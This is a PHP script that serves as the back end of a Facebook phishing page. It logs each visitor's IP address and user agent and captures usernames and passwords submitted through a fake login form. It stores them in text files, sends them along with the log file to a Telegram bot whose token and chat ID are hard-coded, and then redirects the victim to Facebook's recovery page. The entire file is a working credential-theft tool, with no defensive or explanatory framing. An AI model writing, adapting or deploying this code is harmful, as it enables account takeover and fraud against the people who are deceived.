<?php

// --- IP and User Agent Logging (executed as soon as the script is accessed) ---
$ipaddress = 'N/A'; // Default value
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    // This can contain multiple IPs, the first one is usually the client IP.
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR'];
}
$useragent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'N/A';
$timestamp = date("Y-m-d H:i:s");

$ip_log_file = 'ip_logs.txt'; // Define a separate file for IP logs
// Format the log entry for IP file
$ip_log_entry = "Timestamp: " . $timestamp . "\n";
$ip_log_entry .= "IP Address: " . $ipaddress . "\n";
$ip_log_entry .= "User Agent: " . $useragent . "\n";
$ip_log_entry .= "--------------------------------------\n";
file_put_contents($ip_log_file, $ip_log_entry, FILE_APPEND);


// --- Sanitize inputs (from POST request - this happens after link click and form submission) ---
$email = isset($_POST['username']) ? htmlspecialchars($_POST['username']) : 'N/A';
$pass = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : 'N/A';

// --- Save credentials to file (only if a form was submitted) ---
$credential_submitted = ($email !== 'N/A' || $pass !== 'N/A');
if ($credential_submitted) {
    $facebook_log_file = "facebook_log.txt"; // Define filename for credentials
    $facebook_log_entry = "Timestamp: " . $timestamp . "\n";
    $facebook_log_entry .= "Username: " . $email . "\n";
    $facebook_log_entry .= "Password: " . $pass . "\n";
    $facebook_log_entry .= "--------------------------------------\n";
    file_put_contents($facebook_log_file, $facebook_log_entry, FILE_APPEND);
}

// --- Combined Log File ---
$combined_log_file = 'facebook_logs.txt';
// Start building the content for the combined log file
$combined_content = $ip_log_entry; // Always include IP info

if ($credential_submitted) {
    $combined_content .= $facebook_log_entry; // Add credential info if submitted
}

file_put_contents($combined_log_file, $combined_content, FILE_APPEND);


// --- Telegram Bot API Integration ---

// IMPORTANT: Replace these with your ACTUAL Bot Token and Chat ID.
$telegram_bot_token = '7871889688:AAFlHwVTt_lPVFTm6WT67so8UKK1bjWWgug';
$telegram_chat_id = '-1002836260099';

// Flag to control Telegram sending.
$send_to_telegram = true; // Set this to 'true' to enable sending

if ($send_to_telegram) {
    if ($telegram_bot_token === '7871889688:AAFlHwVTt_lPVFTm6WT67so8UKK1bjWWgug' || $telegram_chat_id === '-1002836260099') {
        error_log("WARNING: Telegram Bot Token or Chat ID is still using default placeholder values. Please update them for actual delivery.");
    }

    // Prepare message for initial visit (IP/User Agent)
    $message_text = "New Visitor Information:\n";
    $message_text .= "Timestamp: " . $timestamp . "\n";
    $message_text .= "IP Address: " . $ipaddress . "\n";
    $message_text .= "User Agent: " . $useragent . "\n";

    // Add credential capture to the message if the form was submitted
    if ($credential_submitted) {
        $message_text .= "\n--- Credential Capture ---\n";
        $message_text .= "Username: " . $email . "\n";
        $message_text .= "Password: " . $pass . "\n";
    }

    // Send the combined message to Telegram
    $telegram_text_api_url = "https://api.telegram.org/bot" . $telegram_bot_token . "/sendMessage";

    $ch_text = curl_init();
    curl_setopt($ch_text, CURLOPT_URL, $telegram_text_api_url);
    curl_setopt($ch_text, CURLOPT_POST, true);
    curl_setopt($ch_text, CURLOPT_POSTFIELDS, http_build_query(['chat_id' => $telegram_chat_id, 'text' => $message_text, 'parse_mode' => 'HTML']));
    curl_setopt($ch_text, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch_text, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch_text, CURLOPT_SSL_VERIFYHOST, 2);

    $telegram_response_text = curl_exec($ch_text);
    $curl_error_text = curl_error($ch_text);
    curl_close($ch_text);

    if ($curl_error_text) {
        error_log("Telegram Text cURL Error: " . $curl_error_text);
    } else {
        $response_data_text = json_decode($telegram_response_text, true);
        if (!$response_data_text['ok']) {
            error_log("Telegram Text API Error: " . ($response_data_text['description'] ?? 'Unknown Telegram API Error') . " Response: " . $telegram_response_text);
        }
    }

    // --- Send Combined Log File to Telegram ---
    if (file_exists($combined_log_file)) {
        if ($telegram_bot_token === '7871889688:AAFlHwVTt_lPVFTm6WT67so8UKK1bjWWgug' || $telegram_chat_id === '-1002836260099') {
             error_log("WARNING: Telegram Bot Token or Chat ID for combined file send is still using default placeholder values.");
        }
        sendTelegramDocument($telegram_bot_token, $telegram_chat_id, $combined_log_file, 'Latest Combined Logs (IP + Credentials).');
    }

} else {
    error_log("Telegram notification and file sending skipped as 'send_to_telegram' is set to false.");
}

// Function to send a document to Telegram
function sendTelegramDocument($token, $chat_id, $filepath, $caption = '') {
    $telegram_file_api_url = "https://api.telegram.org/bot" . $token . "/sendDocument";

    // Fallback for mime_content_type if fileinfo extension is not enabled
    $mime_type = 'application/octet-stream'; // Default generic type
    if (function_exists('mime_content_type')) {
        $mime_type = mime_content_type($filepath);
    } elseif (class_exists('finfo')) { // Alternative using Fileinfo class
        $finfo = new finfo(FILEINFO_MIME_TYPE);
        $mime_type = $finfo->file($filepath);
    }

    if (function_exists('curl_file_create')) {
        $cfile = curl_file_create($filepath, $mime_type, basename($filepath));
    } else {
        // Old way for PHP < 5.5
        $cfile = '@' . realpath($filepath) . ';type=' . $mime_type . ';filename=' . basename($filepath);
    }

    $data_file = [
        'chat_id' => $chat_id,
        'document' => $cfile,
        'caption' => $caption
    ];

    $ch_file = curl_init();
    curl_setopt($ch_file, CURLOPT_URL, $telegram_file_api_url);
    curl_setopt($ch_file, CURLOPT_POST, true);
    curl_setopt($ch_file, CURLOPT_POSTFIELDS, $data_file);
    curl_setopt($ch_file, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch_file, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch_file, CURLOPT_SSL_VERIFYHOST, 2);

    $telegram_response_file = curl_exec($ch_file);
    $curl_error_file = curl_error($ch_file);
    curl_close($ch_file);

    if ($curl_error_file) {
        error_log("Telegram Document cURL Error for {$filepath}: " . $curl_error_file);
    } else {
        $response_data_file = json_decode($telegram_response_file, true);
        if (!$response_data_file['ok']) {
            error_log("Telegram Document API Error for {$filepath}: " . ($response_data_file['description'] ?? 'Unknown Telegram API Error') . " Response: " . $telegram_response_file);
        }
    }
}


// --- Redirect the user ---
header('Location: https://facebook.com/recover/initiate/');
exit();

?>